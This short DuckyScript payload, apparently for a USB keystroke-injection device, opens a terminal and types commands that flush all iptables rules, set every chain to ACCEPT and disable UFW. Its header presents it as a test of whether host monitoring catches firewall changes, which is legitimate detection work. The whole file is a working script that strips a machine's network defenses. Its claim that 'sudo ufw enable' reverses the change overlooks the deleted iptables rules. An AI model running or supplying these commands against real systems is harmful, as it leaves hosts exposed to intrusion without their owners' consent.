REM ============================================================
REM  Linux · Disable Firewall (iptables/ufw)
REM ============================================================
REM  Flushes iptables rules and disables UFW if present. Tests
REM  whether host monitoring catches firewall state changes.
REM
REM  Requires sudo. Reversible with: sudo ufw enable

DEFAULTDELAY 80

CTRL ALT t
DELAY 1500
STRINGLN sudo iptables -F && sudo iptables -X && sudo iptables -P INPUT ACCEPT && sudo iptables -P FORWARD ACCEPT && sudo iptables -P OUTPUT ACCEPT
DELAY 1000
STRINGLN sudo ufw disable 2>/dev/null; echo "Firewall disabled"
STRINGLN exit
